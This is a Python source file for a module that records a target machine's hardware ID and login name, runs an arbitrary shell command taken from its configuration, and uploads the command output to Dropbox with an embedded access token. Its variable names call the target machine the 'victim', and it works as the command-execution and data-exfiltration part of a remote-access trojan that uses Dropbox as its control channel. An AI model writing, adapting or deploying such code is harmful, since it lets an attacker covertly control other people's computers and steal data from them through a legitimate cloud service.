import os
import subprocess
import dropbox
from time import time

class DropboxCMDExecutor:

    def __init__(self, config):
        self.config = config
        self._victim_hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].split(' ')[0]
        self._victim_username = os.getlogin()
        substr_replacements: dict = {
            '`hwid`': self._victim_hwid,
            '`victim_username`': self._victim_username
        }
        # replace special substrs in config
        for key in self.config.keys():
            if type(self.config[key]) is not str:
                continue
            for old_substr, new_substr in substr_replacements.items():
                self.config[key] = self.config[key].replace(old_substr, new_substr)

    def run(self) -> None:
        output_filename = str(round(time() * 1000)) + '.txt'
        dropbox_filepath = (self.config['output_dropbox_dirpath'] + '/' + output_filename).replace('//', '/')
        # `text=True` gives back str instead of bytes output
        result = subprocess.run(
            self.config['command'],
            shell=True,
            capture_output=True,
            check=True
        )
        output = result.stdout + result.stderr
        dropbox.Dropbox(self.config['dropbox_token']).files_upload(output, dropbox_filepath)